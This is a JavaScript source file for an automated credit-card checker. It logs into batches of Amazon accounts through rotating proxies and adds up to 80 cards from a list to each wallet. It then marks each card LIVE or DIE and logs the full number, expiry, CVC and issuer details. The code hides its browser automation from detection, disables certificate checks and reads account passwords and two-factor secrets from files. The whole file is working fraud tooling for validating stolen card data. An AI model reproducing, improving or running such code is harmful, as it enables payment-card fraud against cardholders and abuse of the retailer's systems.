const fs = require('fs');
const path = require('path');
const puppeteer = require('puppeteer');
const axios = require('axios');
const windowManager = require('./windowManager');
const { inflateRaw } = require('zlib');
const https = require('https');

const data = JSON.parse(fs.readFileSync(path.join(__dirname, "..", "data", 'data.json'), 'utf8'));

let listCards = fs.readFileSync(path.join(__dirname, "..", "data", 'card.txt'), 'utf8').replaceAll("\r", '').split("\n").map(line => line.trim()).filter(line => line.length > 0);
let indexCard = -1;

// Load all accounts and filter only business accounts
const allAccounts = fs.readFileSync(path.join(__dirname, "..", "data", 'acc.txt'), 'utf8').replaceAll("\r", '').split("\n").map(line => line.trim()).filter(line => line.length > 0);
const dataConfig = JSON.parse(fs.readFileSync(path.join(__dirname, "..", "data", 'data.json'), 'utf8'));
const businessEmails = dataConfig.businessAccounts || [];

// Filter accounts to only include business accounts
let listChild = allAccounts.filter(accountLine => {
    const email = accountLine.split('|')[0];
    return businessEmails.includes(email);
});

console.log(`📊 Loaded: ${allAccounts.length} total accounts, ${listChild.length} business accounts`);

let indexChild = -1;
let listProxy = fs.readFileSync(path.join(__dirname, "..", "data", 'proxies.txt'), 'utf8').replaceAll("\r", '').split("\n").map(line => line.trim()).filter(line => line.length > 0);

// Set total card count at startup
const totalCards = listCards.length;

// ✅ INITIALIZE global.data IF NOT EXISTS - MOVED BEFORE USAGE
if (!global.data) {
    global.data = {};
}
if (!global.data.settings) {
    global.data.settings = {};
}

// ✅ NOW SAFE TO SET PROPERTIES
global.data.cardTotal = totalCards;

// Update UI counters if console.card is available
if (console.card && typeof console.card.setTotal === 'function') {
    console.card.setTotal(totalCards);
}

// Add a BIN cache to reduce API calls
const binCache = {};
const binCacheFile = path.join(__dirname, "..", "data", 'bin_cache.json');

// Load bin cache if it exists
try {
    if (fs.existsSync(binCacheFile)) {
        const cacheData = fs.readFileSync(binCacheFile, 'utf8');
        Object.assign(binCache, JSON.parse(cacheData));
    }
} catch (error) {
    console.log(`❌ BIN cache load error: ${error.message}`);
}

// Save cache periodically
setInterval(() => {
    try {
        fs.writeFileSync(binCacheFile, JSON.stringify(binCache), 'utf8');
    } catch (error) {
        console.log(`❌ BIN cache save error: ${error.message}`);
    }
}, 30000);

// ✅ ALSO INITIALIZE global.temp HERE
if (!global.temp) {
    global.temp = {};
}

async function checkCard() {
    !data.childCount ? data.childCount = {} : "";
    !global.temp ? global.temp = {} : "";
    !global.temp.checkCard ? global.temp.checkCard = {} : "";
    
    // ✅ RESET WINDOW POSITIONS AT START
    windowManager.reset();
    
    console.app(`🚀 Starting card check with ${totalCards} cards`);
    
    if (!listProxy.length) {
        console.app("No proxy found, running with direct connection");
        console.log("No proxy found, running with direct connection");
        initThread(null, 0);
        return;
    }

    for (let i in listProxy) {
        let [host, port, user, pass] = listProxy[i].split(':');
        let proxy = {
            host: host,
            port: port,
            user: user,
            pass: pass
        };
        initThread(proxy, i);
    }
}

async function initThread(proxy, index) {
    indexChild++;
    if (indexChild >= listChild.length) {
        console.app("✅ All accounts processed");
        console.log("✅ All accounts processed");
        return;
    }
    let [email, pass, secret] = listChild[indexChild].split("|");
    if (data.childCount[email] >= 80) {
        console.app(`⏭️ Max cards reached for ${email}`);
        initThread(proxy, index);
        return;
    }

    console.log(`🔐 Starting thread for: ${email} (${data.childCount[email] || 0}/80)`);
    console.app(`🔐 Thread started: ${email} (${data.childCount[email] || 0}/80)`);

    const windowPosition = windowManager.getNextPosition();

    if (!global.data.settings) {
        global.data.settings = {};
    }
    if (!global.data.parentAcc) {
        global.data.parentAcc = {};
    }

    // ✅ TEST PROXY CONNECTION FIRST
    if (proxy) {
        console.log(`🌐 Testing proxy: ${proxy.user}@${proxy.host}:${proxy.port}`);
    } else {
        console.log(`🌐 Running without proxy for: ${email}`);
    }

    const launchOptions = {
        headless: !global.data.settings.showBrowser && global.data.parentAcc.geminiKey != "",
        timeout: 60000, // ✅ INCREASED TIMEOUT
        args: [
            // ✅ IMPROVED PROXY CONFIGURATION
            ...(proxy ? [`--proxy-server=${proxy.host}:${proxy.port}`] : []),
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-web-security',
            '--ignore-certificate-errors',
            '--disable-infobars',
            `--window-position=${windowPosition.x},${windowPosition.y}`,
            `--window-size=${windowPosition.width},${windowPosition.height}`,
            '--disable-dev-shm-usage',
            '--disable-extensions',
            '--disable-gpu',
            '--disable-save-password-bubble',
            '--disable-autofill-keyboard-accessory-view',
            '--disable-autofill-keyboard-accessory',
            '--disable-translate',
            '--disable-features=VizDisplayCompositor',
            '--disable-password-generation',
            '--disable-password-manager-reauthentication',
            '--password-store=basic',
            '--use-mock-keychain',
            '--disable-component-extensions-with-background-pages',
            '--disable-default-apps',
            '--disable-background-timer-throttling',
            '--disable-backgrounding-occluded-windows',
            '--disable-renderer-backgrounding',
            // ✅ ADDITIONAL PROXY FLAGS
            '--proxy-bypass-list=<-loopback>',
            '--disable-proxy-certificate-handler',
            '--ignore-ssl-errors',
            '--ignore-certificate-errors-spki-list',
            '--ignore-ssl-errors-list',
            '--allow-running-insecure-content'
        ],
        ignoreDefaultArgs: ['--enable-automation']
    };

    let browser;
    try {
        browser = await puppeteer.launch(launchOptions);
    } catch (launchError) {
        if (String(launchError.message || '').includes('Could not find Chrome')) {
            const installedChrome = puppeteer.executablePath();
            console.log(`⚠️ Default launch failed, retrying with executablePath: ${installedChrome}`);
            browser = await puppeteer.launch({
                ...launchOptions,
                executablePath: installedChrome
            });
        } else {
            throw launchError;
        }
    }

    const page = await browser.newPage();
    
    await page.setViewport({
        width: windowPosition.width - 20,
        height: windowPosition.height - 100
    });

    // ✅ SET PROXY AUTHENTICATION BEFORE ANY REQUESTS
    if (proxy && proxy.user && proxy.pass) {
        await page.authenticate({
            username: proxy.user,
            password: proxy.pass
        });
    }

    // ✅ SET LONGER TIMEOUTS
    await page.setDefaultNavigationTimeout(90000);
    await page.setDefaultTimeout(90000);

    // ✅ SET USER AGENT TO AVOID DETECTION
    await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');

    // ✅ TEST PROXY FIRST
    if (proxy) {
        try {
            console.log(`🔍 Testing proxy connectivity...`);
            await page.goto('https://httpbin.org/ip', {
                waitUntil: 'networkidle2',
                timeout: 30000
            });

            const proxyIP = await page.evaluate(() => {
                try {
                    return JSON.parse(document.body.innerText).origin;
                } catch {
                    return 'Unknown';
                }
            });

            console.log(`✅ Proxy working: ${proxyIP}`);
            console.app(`✅ Proxy IP: ${proxyIP}`);

        } catch (proxyTestError) {
            console.log(`❌ Proxy test failed: ${proxyTestError.message}`);
            console.app(`❌ Proxy failed: ${email}`);
            await browser.close();

            // ✅ TRY NEXT PROXY OR RETRY
            setTimeout(() => initThread(proxy, index), 5000);
            return;
        }
    } else {
        console.app(`✅ Direct connection: ${email}`);
    }

    let form = {
        email,
        pass,
        code: secret,
        proxy: proxy ? {
            host: proxy.host,
            port: proxy.port,
            username: proxy.user,
            password: proxy.pass
        } : null
    };

    try {
        await require(path.join(__dirname, "..", "api", "login.js"))(page, form);
    } catch (loginError) {
        console.log(`❌ Login failed: ${email} - ${loginError.message}`);
        console.app(`❌ Login failed: ${email}`);
        await browser.close();
        
        // ✅ RETRY WITH DELAY
        setTimeout(() => initThread(proxy, index), 10000);
        return;
    }

    await new Promise(resolve => setTimeout(resolve, 1500));
    if (page.url().includes('account-status.amazon.com')) {
        console.app(`❌ Account suspended: ${email}`);
        console.log(`❌ Account suspended: ${email}`);
        await browser.close();
        initThread(proxy, index);
        return;
    }
    let linkNow = page.url();

    // Ensure we're on the main Amazon page after login
    if (!linkNow.includes('amazon.com') || linkNow.includes('/ap/') || linkNow.includes('/gp/')) {
        // console.log(`Redirecting to Amazon homepage from: ${linkNow}`); // ✅ REMOVED
        // console.app(`Redirecting to Amazon homepage from: ${linkNow}`); // ✅ REMOVED
        try {
            await page.goto('https://www.amazon.com', { 
                waitUntil: 'domcontentloaded',
                timeout: 30000
            });
        } catch (navError) {
            // console.log(`Navigation timeout, continuing anyway: ${navError.message}`); // ✅ REMOVED
            // console.app(`Navigation timeout, continuing anyway: ${navError.message}`); // ✅ REMOVED
        }
        linkNow = page.url();
    }

    // Check the address book
    try {
        await require(path.join(__dirname, "..", "api", "addAddress.js")).gotoBook(page);
        if (!(await require(path.join(__dirname, "..", "api", "addAddress.js")).checkBook(page))) {
            await require(path.join(__dirname, "..", "api", "addAddress.js")).addAddress(page);
        }
        try {
            await page.goto(linkNow, { 
                waitUntil: 'domcontentloaded',
                timeout: 30000 
            });
        } catch (navError) {
            // console.log(`Navigation back to ${linkNow} timed out, continuing: ${navError.message}`); // ✅ REMOVED
        }
    } catch (addressError) {
        console.log(`⚠️ Address error: ${email}`);
        console.app(`⚠️ Address error: ${email}`);
    }

    let res = await require(path.join(__dirname, "..", "api", "goPayment.js"))(page);

    if (res.error) {
        console.log(`❌ Payment page error: ${email}`);
        console.app(`❌ Payment page error: ${email}`);
        browser.close();
        initThread(proxy, index);
        return;
    }

    await clearExistingCards(page, email);
    thread(page, browser, email, index, proxy);
}

/**
 * Clear existing cards in wallet
 */
async function clearExistingCards(page, email) {
    try {
        // console.log(`Checking for existing cards in wallet for ${email}...`); // ✅ REMOVED
        // console.app(`Checking for existing cards in wallet for ${email}...`); // ✅ REMOVED
        
        await new Promise(resolve => setTimeout(resolve, 3000));
        
        const currentUrl = page.url();
        if (!currentUrl.includes('yourpayments') || !currentUrl.includes('wallet')) {
            await page.goto('https://www.amazon.com/cpe/yourpayments/wallet', { 
                waitUntil: 'domcontentloaded',
                timeout: 30000 
            });
            await new Promise(resolve => setTimeout(resolve, 5000));
        }

        let existingCardCount = await page.evaluate(() => {
            const walletContainer = document.querySelector('.a-scroller.apx-wallet-desktop-payment-method-selectable-tab-css.a-scroller-vertical');
            
            if (!walletContainer || !walletContainer.childNodes[0]) {
                return 0;
            }
            
            const paymentMethods = walletContainer.childNodes[0].childNodes;
            let realCardCount = 0;
            
            for (let i = 0; i < paymentMethods.length; i++) {
                const method = paymentMethods[i];
                
                if (method.nodeName && method.nodeName.toLowerCase() === 'div') {
                    const isAddBox = method.querySelector('.apx-add-payment-method-box, .pmts-add-pm-tile, [data-testid="pmts-add-payment-method-tile"]');
                    
                    if (!isAddBox) {
                        realCardCount++;
                    }
                }
            }
            
            return realCardCount;
        });

        if (existingCardCount === 0) {
            // console.log(`No existing cards found for ${email}, proceeding to add new cards`); // ✅ REMOVED
            // console.app(`No existing cards found for ${email}, proceeding to add new cards`); // ✅ REMOVED
            return;
        }

        console.log(`🗑️ Removing ${existingCardCount} existing cards: ${email}`);
        console.app(`🗑️ Removing ${existingCardCount} existing cards: ${email}`);

        let removedCount = 0;
        let maxRetries = 10;
        
        while (removedCount < existingCardCount && maxRetries > 0) {
            maxRetries--;
            
            const cardClicked = await page.evaluate(() => {
                const walletContainer = document.querySelector('.a-scroller.apx-wallet-desktop-payment-method-selectable-tab-css.a-scroller-vertical');
                
                if (!walletContainer || !walletContainer.childNodes[0]) {
                    return false;
                }
                
                const paymentMethods = walletContainer.childNodes[0].childNodes;
                
                for (let i = 0; i < paymentMethods.length; i++) {
                    const method = paymentMethods[i];
                    
                    if (method.nodeName && method.nodeName.toLowerCase() === 'div') {
                        const isAddBox = method.querySelector('.apx-add-payment-method-box, .pmts-add-pm-tile, [data-testid="pmts-add-payment-method-tile"]');
                        
                        if (!isAddBox) {
                            method.click();
                            return true;
                        }
                    }
                }
                
                return false;
            });

            if (!cardClicked) {
                // console.log(`No more cards to click for ${email}, breaking loop`); // ✅ REMOVED
                break;
            }

            await new Promise(resolve => setTimeout(resolve, 3000));

            const cardInfo = await page.evaluate(() => {
                const cardSelectors = [
                    '.a-size-base-plus.pmts-instrument-number-tail span',
                    '.pmts-instrument-number span',
                    '[class*="instrument-number"] span'
                ];
                
                let cardNumber = 'Unknown';
                for (const selector of cardSelectors) {
                    const element = document.querySelector(selector);
                    if (element && element.innerText) {
                        cardNumber = element.innerText;
                        break;
                    }
                }
                
                return { number: cardNumber };
            });

            let retryCount = 0;
            let cardRemoved = { success: false };
            
            while (retryCount < 3 && !cardRemoved.success) {
                cardRemoved = await removeCard(page);
                
                if (cardRemoved.success) {
                    removedCount++;
                    // console.log(`Removed existing card: ${cardInfo.number} for ${email} (${removedCount}/${existingCardCount})`); // ✅ REMOVED - TOO VERBOSE
                    // console.app(`Removed existing card: ${cardInfo.number} for ${email} (${removedCount}/${existingCardCount})`); // ✅ REMOVED
                    await new Promise(resolve => setTimeout(resolve, randomInt(2000, 3000)));
                    break;
                } else if (cardRemoved.reload) {
                    // console.log(`Reloading page to retry card removal for ${email}`); // ✅ REMOVED
                    await page.reload({ waitUntil: ["domcontentloaded"] });
                    await new Promise(resolve => setTimeout(resolve, 3000));
                    retryCount++;
                } else {
                    // console.log(`Failed to remove card: ${cardInfo.number} for ${email}, attempt ${retryCount + 1}`); // ✅ REMOVED
                    retryCount++;
                    await new Promise(resolve => setTimeout(resolve, 2000));
                }
            }
            
            if (!cardRemoved.success) {
                // console.log(`Failed to remove card after 3 attempts: ${cardInfo.number} for ${email}`); // ✅ REMOVED
                continue;
            }
        }

        console.log(`✅ Cleared ${removedCount}/${existingCardCount} cards: ${email}`);
        console.app(`✅ Cleared ${removedCount}/${existingCardCount} cards: ${email}`);

        await new Promise(resolve => setTimeout(resolve, 2000));

    } catch (error) {
        console.log(`❌ Clear cards error: ${email} - ${error.message}`);
        console.app(`❌ Clear cards error: ${email}`);
    }
}

async function thread(page, browser, email, index, proxy) {
    // ✅ ENSURE TEMP STORAGE IS INITIALIZED
    if (!global.temp.checkCard[index]) {
        global.temp.checkCard[index] = {};
    }
    
    // ✅ CHECK CONDITIONS MORE CAREFULLY
    const isCardListEmpty = indexCard >= listCards.length;
    const hasCardsToVerify = Object.keys(global.temp.checkCard[index]).length > 0;
    
    console.log(`📊 Thread status: cardList empty=${isCardListEmpty}, hasCardsToVerify=${hasCardsToVerify}`);
    
    if (isCardListEmpty && !hasCardsToVerify) {
        console.app("🏁 All cards processed and verified");
        console.log("🏁 All cards processed and verified");
        await browser.close();
        clearInterval(saveData);
        return;
    }
    
    if (isCardListEmpty && hasCardsToVerify) {
        console.log(`🔄 No more cards to add, but ${Object.keys(global.temp.checkCard[index]).length} cards need verification: ${email}`);
        console.app(`🔄 Verifying remaining cards: ${email}`);
        
        updateRemainingCardCount();
        
        await new Promise(resolve => setTimeout(resolve, global.data.settings.checkAfter));
        
        return checkWallet(page, browser, email, index, proxy);
    }
    
    const currentCount = data.childCount[email] || 0;
    if (currentCount >= 80) {
        console.app(`⏭️ Max cards reached: ${email} (${currentCount}/80)`);
        console.log(`⏭️ Max cards reached: ${email} (${currentCount}/80)`);
        initThread(proxy, index);
        return;
    }
    
    console.log(`➕ Adding cards: ${email} (${currentCount}/80)`);
    console.app(`➕ Adding cards: ${email} (${currentCount}/80)`);
    
    for (let i = 0; i < 5; i++) {
        indexCard++;
        let card = listCards[indexCard];
        if (indexCard >= listCards.length) {
            console.app("📋 All cards from list added");
            break;
        }
        let [number, month, year, cvc] = card.split('|');
        year = year.length == 2 ? '20' + year : year;
        month = month.length == 1 ? '0' + month : month;
        let form = {
            number,
            month,
            year,
            name: 'Saint David',
            cvc
        };
        // console.log(`Card: ${card} for ${email} (${data.childCount[email] || 0}/80)`); // ✅ REMOVED - TOO VERBOSE
        // console.app(`Card: ${card} for ${email} (${data.childCount[email] || 0}/80)`); // ✅ REMOVED
        
        const getAddCardErrorCode = (result) => {
            if (!result) return 'UNKNOWN';
            if (typeof result.error === 'string') return result.error;
            if (result.error && typeof result.error.message === 'string') return result.error.message;
            return 'UNKNOWN';
        };

        let res = await require(path.join(__dirname, "..", "api", "addCard.js"))(page, form);
        let attempts = 1;
        const maxAttempts = 5;
        let lastAddCardError = getAddCardErrorCode(res);
        while (!res.success && attempts < maxAttempts) {
            // console.log(`Retry attempt ${attempts}/${maxAttempts} for card: ${card}. Error: ${res.error || 'Unknown'}`); // ✅ REDUCED VERBOSITY
            // console.app(`Retry attempt ${attempts}/${maxAttempts} for card: ${card}. Error: ${res.error || 'Unknown'}`); // ✅ REMOVED
            lastAddCardError = getAddCardErrorCode(res);
            attempts++;
            
            await new Promise(resolve => setTimeout(resolve, 5000));
            
            try {
                // console.log("Refreshing page for retry..."); // ✅ REMOVED
                await page.reload({ 
                    waitUntil: ['domcontentloaded'],
                    timeout: 30000
                });
                
                await new Promise(resolve => setTimeout(resolve, 8000));
                
                const currentUrl = page.url();
                if (!currentUrl.includes('yourpayments') || !currentUrl.includes('wallet')) {
                    // console.log("Not on payment page after reload, navigating back..."); // ✅ REMOVED
                    let navRes = await require(path.join(__dirname, "..", "api", "goPayment.js"))(page);
                    if (navRes.error) {
                        // console.log(`Navigation failed: ${navRes.error}`); // ✅ REMOVED
                        break;
                    }
                    await new Promise(resolve => setTimeout(resolve, 5000));
                }
                
            } catch (error) {
                if (error.name === 'TimeoutError') {
                    // console.log('Page reload timed out, continuing anyway...'); // ✅ REMOVED
                } else {
                    const reloadError = error && error.message ? error.message : String(error);
                    console.log(`WARN Reload error while retrying add card: ${reloadError}`);
                }
            }
            
            res = await require(path.join(__dirname, "..", "api", "addCard.js"))(page, form);
            lastAddCardError = getAddCardErrorCode(res);
        }
        
        if (!res.success) {
            console.log(`Card add failed: ***${card.slice(-4)} after ${maxAttempts} attempts. Last error: ${lastAddCardError}`);
            console.app(`❌ Card add failed: ***${card.slice(-4)}`);
            continue;
        }

        // Card info extraction with better error handling
        let cardInfo = null;
        let extractionAttempts = 0;
        const maxExtractionAttempts = 3;
        
        while (!cardInfo && extractionAttempts < maxExtractionAttempts) {
            extractionAttempts++;
            // console.log(`Attempting to extract card info, attempt ${extractionAttempts}/${maxExtractionAttempts}`); // ✅ REMOVED
            
            try {
                const selectorResults = await Promise.allSettled([
                    page.waitForSelector('.a-size-base-plus.pmts-instrument-number-tail span', { timeout: 8000 }),
                    page.waitForSelector('.pmts-instrument-number span', { timeout: 6000 }),
                    page.waitForSelector('[class*="instrument-number"] span', { timeout: 6000 }),
                    page.waitForSelector('[data-testid="pmts-credit-card-instrument"]', { timeout: 8000 })
                ]);
                
                let workingSelector = null;
                const selectors = [
                    '.a-size-base-plus.pmts-instrument-number-tail span',
                    '.pmts-instrument-number span',
                    '[class*="instrument-number"] span',
                    '[data-testid="pmts-credit-card-instrument"]'
                ];
                
                for (let i = 0; i < selectorResults.length; i++) {
                    if (selectorResults[i].status === 'fulfilled') {
                        workingSelector = selectors[i];
                        // console.log(`✅ Found working selector: ${workingSelector}`); // ✅ REMOVED
                        break;
                    }
                }
                
                if (!workingSelector) {
                    // console.log(`❌ No working selector found on attempt ${extractionAttempts}, trying page navigation...`); // ✅ REMOVED
                    
                    await page.goto('https://www.amazon.com/cpe/yourpayments/wallet', { 
                        waitUntil: 'domcontentloaded',
                        timeout: 15000
                    });
                    await new Promise(resolve => setTimeout(resolve, 5000));
                    
                    try {
                        await page.waitForSelector('.a-size-base-plus.pmts-instrument-number-tail span', { timeout: 8000 });
                        workingSelector = '.a-size-base-plus.pmts-instrument-number-tail span';
                        // console.log('✅ Card info found after wallet navigation'); // ✅ REMOVED
                    } catch (navError) {
                        // console.log(`Still no card info after navigation: ${navError.message}`); // ✅ REMOVED
                        if (extractionAttempts < maxExtractionAttempts) {
                            await new Promise(resolve => setTimeout(resolve, 3000));
                            continue;
                        } else {
                            throw new Error('Card extraction failed after all attempts');
                        }
                    }
                }
                
                cardInfo = await page.evaluate((selector) => {
                    let card = document.querySelector(selector);
                    
                    if (!card) {
                        const cardSelectors = [
                            '.a-size-base-plus.pmts-instrument-number-tail span',
                            '.pmts-instrument-number span',
                            '[class*="instrument-number"] span',
                            '.pmts-instrument-display-number',
                            '[data-testid="pmts-credit-card-instrument"] span'
                        ];
                        
                        for (const sel of cardSelectors) {
                            card = document.querySelector(sel);
                            if (card && card.innerText) break;
                        }
                    }

                    let link = null;
                    const imgSelectors = [
                        '.a-row.apx-wallet-payment-method-details-section.pmts-portal-component .a-fixed-left-grid-col.a-col-left img',
                        '.pmts-portal-component img',
                        '.apx-wallet-payment-method-details-section img',
                        '[data-testid="pmts-credit-card-instrument"] img',
                        '.pmts-instrument-brand img'
                    ];
                    
                    for (const sel of imgSelectors) {
                        link = document.querySelector(sel);
                        if (link && link.src) break;
                    }

                    return {
                        number: card ? card.innerText : '',
                        link: link ? link.src : ''
                    };
                }, workingSelector);
                
                if (cardInfo && cardInfo.number) {
                    // console.log(`✅ Successfully extracted card info: ${cardInfo.number}`); // ✅ REMOVED
                    break;
                } else {
                    // console.log(`❌ Card info extraction returned empty data`); // ✅ REMOVED
                    cardInfo = null;
                }
                
            } catch (error) {
                // console.log(`Card info extraction attempt ${extractionAttempts} failed: ${error.message}`); // ✅ REMOVED
                if (extractionAttempts < maxExtractionAttempts) {
                    await new Promise(resolve => setTimeout(resolve, 3000));
                } else {
                    // console.log(`❌ Failed to extract card info after ${maxExtractionAttempts} attempts, skipping card ${card}`); // ✅ REMOVED
                    break;
                }
            }
        }

        if (!cardInfo || !cardInfo.number) {
            console.log(`⚠️ No card info found: ***${card.slice(-4)}`);
            console.app(`⚠️ No card info found: ***${card.slice(-4)}`);
            continue;
        }

        let fourNum = cardInfo.number.split('•••• ')[1];
        if (!fourNum) {
            // console.log(`Could not extract last 4 digits from ${cardInfo.number}, using full number`); // ✅ REMOVED
            fourNum = cardInfo.number.replace(/\D/g, '').slice(-4);
        }
        
        global.temp.checkCard[index][fourNum] = {
            img: cardInfo.link,
            card: form
        }

        data.childCount[email] = (data.childCount[email] || 0) + 1;
        console.log(`✅ Card added: ${email} (${data.childCount[email]}/80)`);
        console.app(`✅ Card added: ${email} (${data.childCount[email]}/80)`);
        
        fs.writeFileSync(path.join(__dirname, "..", "data", 'data.json'), JSON.stringify(data, null, 2), 'utf8');
        
        await new Promise(resolve => setTimeout(resolve, randomInt(1000, 2000)));
    }

    updateRemainingCardCount();

    console.log(`⏳ Waiting ${global.data.settings.checkAfter / 1000}s before wallet check: ${email}`);
    console.app(`⏳ Waiting ${global.data.settings.checkAfter / 1000}s: ${email}`);

    await new Promise(resolve => setTimeout(resolve, global.data.settings.checkAfter));

    console.log(`🔍 Checking wallet: ${email}`);
    console.app(`🔍 Checking wallet: ${email}`);

    checkWallet(page, browser, email, index, proxy);
}

/**
 * Check wallet and verify card status
 */
async function checkWallet(page, browser, email, index, proxy) {
    try {
        console.log(`🔍 Wallet check starting: ${email}`);
        console.log(`   Cards in temp storage: ${Object.keys(global.temp.checkCard[index] || {}).length}`);
        console.app(`🔍 Checking wallet: ${email}`);
        
        await page.reload({ 
            waitUntil: ["networkidle0", "domcontentloaded"],
            timeout: data.settings.navigationTimeout || 30000
        });

        await page.waitForSelector('.a-scroller.apx-wallet-desktop-payment-method-selectable-tab-css.a-scroller-vertical', { timeout: 15000 });

        let length = await page.evaluate(async () => {
            let wallet = document.querySelector('.a-scroller.apx-wallet-desktop-payment-method-selectable-tab-css.a-scroller-vertical');
            return wallet && wallet.childNodes[0] ? wallet.childNodes[0].childNodes.length : 0;
        });

        console.log(`📊 Found ${length} items in wallet`);

        // ✅ FIX: RENAME FROM indexCard TO cardIndex
        let cardIndex = 0;  // ✅ CHANGED FROM indexCard
        let processedCards = 0;
        let removedCards = 0;
        
        while (cardIndex < length) {
            console.log(`🔄 Processing card ${cardIndex + 1}/${length}`);
            
            let walletClicked = await page.evaluate((i) => {
                let container = document.querySelector('.a-scroller.apx-wallet-desktop-payment-method-selectable-tab-css.a-scroller-vertical');
                if (!container || !container.childNodes[0] || !container.childNodes[0].childNodes[i]) return false;
                
                let wallet = container.childNodes[0].childNodes[i];
                if (wallet && wallet.nodeName && wallet.nodeName.toLowerCase() == 'div') {
                    // ✅ CHECK IF IT'S AN ADD CARD BOX
                    const isAddBox = wallet.querySelector('.apx-add-payment-method-box, .pmts-add-pm-tile, [data-testid="pmts-add-payment-method-tile"]');
                    if (isAddBox) {
                        console.log('Skipping Add Payment Method box');
                        return false;
                    }
                    
                    wallet.click();
                    return true;
                }
                return false;
            }, cardIndex);

            if (!walletClicked) {
                console.log(`   ⏭️ Skipped item ${cardIndex + 1} (not a card or add box)`);
                cardIndex++;  // ✅ INCREMENT cardIndex
                continue;
            }
            
            await new Promise(resolve => setTimeout(resolve, 3000));
            
            let cardInfo = await page.evaluate(() => {
                let card = document.querySelector('.a-size-base-plus.pmts-instrument-number-tail span');
                let link = document.querySelector('.a-row.apx-wallet-payment-method-details-section.pmts-portal-component .a-fixed-left-grid-col.a-col-left img');

                return {
                    number: card ? card.innerText : '',
                    link: link ? link.src : '',
                };
            });

            if (!cardInfo.number) {
                console.log(`   ⚠️ No card number found for item ${cardIndex + 1}`);
                cardIndex++;  // ✅ INCREMENT cardIndex
                continue;
            }

            let fourNum = cardInfo.number.split('•••• ')[1];
            if (!fourNum) {
                fourNum = cardInfo.number.replace(/\D/g, '').slice(-4);
            }

            console.log(`   📋 Processing card ***${fourNum}`);

            // ✅ CHECK IF THIS CARD IS IN OUR TEMP STORAGE
            if (!global.temp.checkCard[index] || !global.temp.checkCard[index][fourNum]) {
                console.log(`   ⚠️ Card ***${fourNum} not in temp storage, might be old card`);
                
                // ✅ REMOVE OLD CARDS NOT IN OUR SESSION
                const cardRemoved = await removeCard(page);
                let removeRetries = 0;
                const maxRemoveRetries = 3;
                
                while (cardRemoved.reload && removeRetries < maxRemoveRetries) {
                    removeRetries++;
                    console.log(`   🔄 Retrying card removal ${removeRetries}/${maxRemoveRetries}`);
                    await page.reload({ waitUntil: ["networkidle0", "domcontentloaded"] });
                    await new Promise(resolve => setTimeout(resolve, randomInt(2000, 3000)));
                    
                    const retryRemove = await removeCard(page);
                    if (retryRemove.success) {
                        console.log(`   ✅ Old card ***${fourNum} removed`);
                        removedCards++;
                        break;
                    }
                }
                
                cardIndex++;  // ✅ INCREMENT cardIndex
                continue;
            }

            processedCards++;
            console.log(`   🔍 Checking card ***${fourNum} (${processedCards} processed)`);

            let cardBin = await getCardInfo(global.temp.checkCard[index][fourNum].card.number);
            if (!cardBin.success) {
                console.log(`   ⚠️ BIN lookup failed for ***${fourNum}`);
                // Use fallback data
                cardBin = {
                    scheme: 'Unknown',
                    type: 'Unknown', 
                    cardTier: 'Unknown',
                    a2: 'Unknown',
                    country: 'Unknown',
                    issuer: 'Unknown'
                };
            }

            const storedImg = global.temp.checkCard[index][fourNum].img || '';
            const currentImg = cardInfo.link || '';

            console.log(`   🖼️ Image comparison: stored=${storedImg.slice(-20)}, current=${currentImg.slice(-20)}`);

            // ✅ REMOVE CARD AFTER CHECKING
            const cardRemoved = await removeCard(page);
            let removeRetries = 0;
            const maxRemoveRetries = 3;
            
            while (cardRemoved.reload && removeRetries < maxRemoveRetries) {
                removeRetries++;
                console.log(`   🔄 Retrying card removal ${removeRetries}/${maxRemoveRetries}`);
                await page.reload({ waitUntil: ["networkidle0", "domcontentloaded"] });
                await new Promise(resolve => setTimeout(resolve, randomInt(2000, 3000)));
                
                const retryRemove = await removeCard(page);
                if (retryRemove.success) {
                    break;
                }
            }
            
            if (!cardRemoved.success && removeRetries >= maxRemoveRetries) {
                console.log(`   ❌ Failed to remove card ***${fourNum} after ${maxRemoveRetries} retries`);
                cardIndex++;  // ✅ INCREMENT cardIndex
                continue;
            }

            removedCards++;
            console.log(`   🗑️ Card ***${fourNum} removed successfully (${removedCards} total removed)`);

            saveRemainingCards();

            // ✅ DETERMINE CARD STATUS
            if (storedImg !== currentImg) {
                console.card.live(`LIVE|${global.temp.checkCard[index][fourNum].card.number}|${global.temp.checkCard[index][fourNum].card.month}|${global.temp.checkCard[index][fourNum].card.year}|${global.temp.checkCard[index][fourNum].card.cvc}|- Info Bank: ${cardBin.scheme}|${cardBin.type}|${cardBin.cardTier}|${cardBin.a2}|${cardBin.country}|${cardBin.issuer}`);
                console.log(`✅ LIVE - Card ***${fourNum}`);
                console.app(`✅ LIVE - Card ***${fourNum}`);
            } else {
                console.card.die(`DIE|${global.temp.checkCard[index][fourNum].card.number}|${global.temp.checkCard[index][fourNum].card.month}|${global.temp.checkCard[index][fourNum].card.year}|${global.temp.checkCard[index][fourNum].card.cvc}|- Info Bank: ${cardBin.scheme}|${cardBin.type}|${cardBin.cardTier}|${cardBin.a2}|${cardBin.country}|${cardBin.issuer}`);
                console.log(`❌ DIE - Card ***${fourNum}`);
                console.app(`❌ DIE - Card ***${fourNum}`);
            }
            
            // ✅ DELETE PROCESSED CARD FROM TEMP STORAGE
            delete global.temp.checkCard[index][fourNum];
            
            cardIndex++;  // ✅ INCREMENT cardIndex
        }
        
        console.log(`📊 Wallet check completed: ${processedCards} cards processed, ${removedCards} cards removed`);
        console.app(`📊 Wallet check: ${processedCards} processed, ${removedCards} removed`);
        
        // ✅ CHECK IF ALL CARDS HAVE BEEN PROCESSED
        const remainingTempCards = Object.keys(global.temp.checkCard[index] || {}).length;
        
        if (remainingTempCards > 0) {
            console.log(`🔄 ${remainingTempCards} cards still in temp storage, continuing...`);
            console.app(`🔄 ${remainingTempCards} cards remaining`);
            // Go back to thread to continue processing
            return thread(page, browser, email, index, proxy);
        } else {
            console.log(`✅ All cards processed for ${email}, starting new batch`);
            console.app(`✅ All cards processed: ${email}`);
            // Continue with new cards
            return thread(page, browser, email, index, proxy);
        }
        
    } catch (error) {
        console.log(`❌ Wallet check error: ${email} - ${error.message}`);
        console.app(`❌ Wallet check error: ${email}`);
        
        // ✅ ADD RETRY LOGIC FOR WALLET CHECK ERRORS
        await new Promise(resolve => setTimeout(resolve, 5000));
        return thread(page, browser, email, index, proxy);
    }
}

